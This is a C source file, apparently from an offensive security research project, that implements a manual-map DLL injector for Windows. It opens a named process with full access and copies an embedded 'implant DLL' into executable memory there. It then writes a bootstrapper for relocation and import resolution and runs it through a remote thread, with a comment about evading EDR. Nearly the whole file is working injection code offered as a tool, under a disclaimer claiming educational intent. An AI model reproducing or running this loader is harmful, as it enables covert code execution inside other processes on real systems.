/**
 * LEGAL NOTICE APPLIES
 * This project, including all associated source code and documentation, is developed and shared solely for 
 * educational, research, and defensive purposes in the field of cybersecurity. It is intended to be used 
 * exclusively by cybersecurity professionals, researchers, and educators to enhance understanding, develop defensive 
 * strategies, and improve security postures.
 * 
 * Under no circumstances shall this project be used for criminal, unethical, or any other unauthorized activities. 
 * This is meant to serve as a resource for learning and should not be employed for offensive operations or actions 
 * that infringe upon any individual's or organization's rights or privacy.
 * 
 * The author of this project disclaims any responsibility for misuse or illegal application of the material 
 * provided herein. By accessing, studying, or using this project, you acknowledge and agree to use the information 
 * contained within strictly for lawful purposes and in a manner that is consistent with ethical guidelines and applicable 
 * laws and regulations.
 * 
 * USE AT YOUR OWN RISK. If you decide to use this software CONDUCT A THOROUGH INDEPENDENT CODE REVIEW to ensure it meets 
 * your standards. No unofficial third party dependencies are included to minimise attack surface of a supply chain risk.
 * I cannot be held responsible for any problems that arise as a result of executing this, the burden is on the user of the
 * software to validate its safety & integrity. All care has been taken to write safe code.
 * 
 * It is the user's responsibility to comply with all relevant local, state, national, and international laws and regulations 
 * related to cybersecurity and the use of such tools and information. If you are unsure about the legal implications of using 
 * or studying the material provided in this project, please consult with a legal professional before proceeding. Remember, 
 * responsible and ethical behavior is paramount in cybersecurity research and practice. The knowledge and tools shared in 
 * this project are provided in good faith to contribute positively to the cybersecurity community, and I trust they will be 
 * used with the utmost integrity.
 * 
 * */
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include "dll_injector.h"
#include "dll_byte_array.h"
#include "bootstrapper.h"

// finds and returns a handle to a process given its name
HANDLE find_process_and_get_handle(char *process_name) {
      
    HANDLE snapshot                 = NULL; 
    HANDLE process_handle           = NULL;
    PROCESSENTRY32 process_entry;
    BOOL process_found              = 0;

    process_entry.dwSize = sizeof(process_entry);

    // snapshot of all processes in the system
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    // iterate through the process list and find the process by name
     if (Process32First(snapshot, &process_entry)) {
        do {
            if (!strcmp(process_name, process_entry.szExeFile)) {
                process_found = TRUE;
                break;
            }
        } while (Process32Next(snapshot, &process_entry));
    } else {
        CloseHandle(snapshot);
        return NULL;
    }

    CloseHandle(snapshot);

    if(!process_found) {
        return NULL;
    }

    // open the process with all possible access rights - WARN: may trigger EDR
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_entry.th32ProcessID);
    if (process_handle == NULL) {
        printf("[i] OpenProcess function call failed.\n");
        return NULL;
    }

    return process_handle;
}

int main(int argc, char **argv) {

    char *process_name              = argv[1];
    char *dll_path                  = argv[2];

    HANDLE target_process_handle    = INVALID_HANDLE_VALUE;
    LPVOID local_dll_base           = (LPVOID)dll_data; // DLL data
    LPVOID target_base_addr         = NULL;
    LPVOID bootstrap_memory_base     = NULL;
    PIMAGE_DOS_HEADER dos_header    = NULL;
    PIMAGE_SECTION_HEADER section   = NULL;
    PIMAGE_NT_HEADERS nt            = NULL;
    DWORD bootstrap_code_size                 = 0;
    DLL_INFO dll_info;

    dos_header = (PIMAGE_DOS_HEADER)local_dll_base;

    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid file.\n");
        return EXIT_FAILURE;
    }

    nt = (PIMAGE_NT_HEADERS)(local_dll_base + dos_header->e_lfanew);
    section = (PIMAGE_SECTION_HEADER)((LPVOID) nt+24+nt->FileHeader.SizeOfOptionalHeader);

    if (nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        printf("[-] Not a 64-bit PE, .\n");
        return EXIT_FAILURE;
    }

    /***********************
     * Open target process
     * *********************/

    target_process_handle = find_process_and_get_handle(process_name);
    if (target_process_handle == NULL) {
        printf("[-] Failed to get handle.");
        return EXIT_FAILURE;
    }

    /***********************
     * Allocate memory in target process
     * *********************/
    dll_info.base_relocation_required = FALSE;

    // Allocating memory in the target process with the size equal to the DLL's image size.
    // This space is reserved for the entire content of the DLL including headers, sections, and other data.
    if ((target_base_addr = VirtualAllocEx(target_process_handle, (LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
        dll_info.base_relocation_required = TRUE;

        if ((target_base_addr = VirtualAllocEx(target_process_handle, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
            //printf("[-] Failed to allocate memory into target process.\n");
            return EXIT_FAILURE;
        }
    }

    /***********************
     * Copy in headers
     * *********************/
    // Writing the PE headers of the DLL into the allocated memory in the target process.
    // This includes the DOS header, NT headers, and optional headers which define the structure and execution information of the PE file.
    WriteProcessMemory(target_process_handle, target_base_addr, local_dll_base, nt->OptionalHeader.SizeOfHeaders, NULL);

    /***********************
     * Copy in sections
     * *********************/

    // Iterating through the sections of the PE (like .text, .data, .rdata) and writing them to the allocated memory.
    // Each section is copied to its respective virtual address offset within the allocated space.
    printf("Number of sections in implant DLL: %d\n", nt->FileHeader.NumberOfSections);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        printf("Copying section into process memory: %s, size: %d\n", section->Name, section->SizeOfRawData);
        WriteProcessMemory(target_process_handle, target_base_addr + section->VirtualAddress, local_dll_base + section->PointerToRawData, section->SizeOfRawData, NULL);
        section++;
    }

    // Calculate the memory size required for the bootstrapper code.
    // We do this by finding the difference between the addresses of two markers: 
    // 'start_of_injectable_code' and 'end_of_injectable_code'.
    // These markers define the beginning and end of the bootstrapper code segment in memory.
    // If any other bootstrap actions are required within the memory of the target process, make sure
    // they are added between those two markers in bootstrapper.c.
    bootstrap_code_size = (DWORD)((ULONGLONG)end_of_injectable_code - (ULONGLONG)start_of_injectable_code);
    dll_info.base = target_base_addr;   // the base address of the DLL inside the target process. When realign_pe is executed, 
                                        // it uses this information from dll_info_struct to locate and interact with the DLL.
    dll_info.get_process_addr = GetProcAddress;
    dll_info.load_library_a_addr = LoadLibraryA;

    // Allocating memory in the target process for the bootstrapping code.
    // This memory will host the custom code responsible for properly loading and aligning the DLL in the process's memory.
    bootstrap_memory_base = VirtualAllocEx(target_process_handle, NULL, bootstrap_code_size + sizeof(dll_info), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if(bootstrap_memory_base == NULL) {
        printf("[-] Failed to allocate memory for PE.\n");
        VirtualFreeEx(target_process_handle, target_base_addr, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }

    // Writing the DLL_INFO structure to the beginning of the allocated bootstrapping memory.
    // This structure contains crucial information like base addresses and function pointers needed by the bootstrapping code.
    WriteProcessMemory(target_process_handle, bootstrap_memory_base, &dll_info, sizeof(dll_info), NULL);

    // Writing the bootstrapping code (realign_pe function) immediately after the DLL_INFO structure in the allocated memory.
    // This code will perform tasks like base relocation and import address table resolution.
    WriteProcessMemory(target_process_handle, bootstrap_memory_base + sizeof(dll_info), realign_pe, bootstrap_code_size, NULL);

    // create a thread in the target process, the thread starts executing at the memory location where realign_pe was written 
    if (!CreateRemoteThread(target_process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)(bootstrap_memory_base + sizeof(dll_info)), bootstrap_memory_base, 0, NULL)) {
        printf("[-] Failed to complete.\n");
        return EXIT_FAILURE;
    }

    // gg :)
    return EXIT_SUCCESS;
}